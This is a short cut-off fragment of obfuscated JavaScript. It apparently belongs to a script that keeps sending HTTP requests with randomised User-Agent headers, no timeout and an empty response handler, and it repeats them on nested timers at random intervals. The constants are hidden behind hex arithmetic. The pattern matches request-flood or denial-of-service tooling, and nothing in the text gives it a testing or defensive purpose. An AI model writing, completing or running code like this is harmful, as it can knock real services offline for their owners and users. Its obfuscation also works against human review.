      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })[a2(0x10)](h => {});
  }, (-0x1d06 + -0x263 + 0x3ac1) * getRandomInt(0x3c4 + -0x56d * 0x3 + 0xc84, -0x1 * -0xb39 + -0xd7d + -0x75 * -0x5));
}, 0x2a1 + 0x2 * -0x599 + 0x8f5);